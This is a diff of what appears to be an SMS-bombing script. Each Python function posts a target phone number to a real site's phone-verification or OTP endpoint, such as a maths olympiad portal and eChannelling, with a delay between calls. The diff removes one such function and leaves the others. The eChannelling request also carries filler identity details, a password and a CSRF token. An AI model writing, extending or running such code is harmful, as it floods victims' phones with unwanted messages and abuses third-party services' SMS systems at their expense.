@@ -149,12 +149,6 @@ def domin(num,delay):
     data={'lastName':'','mobile':num[1:],'firstName':''}
     po=post(url,headers=headers,json=data)
     time.sleep(delay)
-def oli(num,delay):
-    url='https://compete.slmathsolympiad.org/api/parent/verifyPhone'
-    head={'Host':'compete.slmathsolympiad.org','User-Agent': 'Mozilla/5.0 (Linux; Android 10; Nokia 2.2 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Content-Type':'application/json'}
-    data={"phone1":num}
-    po=post(url,headers=head,json=data)
-    time.sleep(delay)
 def echan(num,delay):
     url='https://www.echannelling.com/Echannelling/member-registration-otp'
     body={'paymentMode':'FMR','title':'Mr','firstName':'Santha','lastName':'Fernando','memberType':'FREE','country':'','nic':'200218009878','dobs':'02/08/1982','pindelivery':'','deliveryAddress':'eChannellingPLC','cardCollect':'collect','password':'123456','email':'santha@abc.net','mobile':num,'address':'','other':'','totalFee':'0','joiningFee':'0','annualFee':'0','postalFee':'0','ipAddress':'10.10.10.2','_csrf':'fb7ec8ee-e67b-426f-be2b-ea758cd36337'}
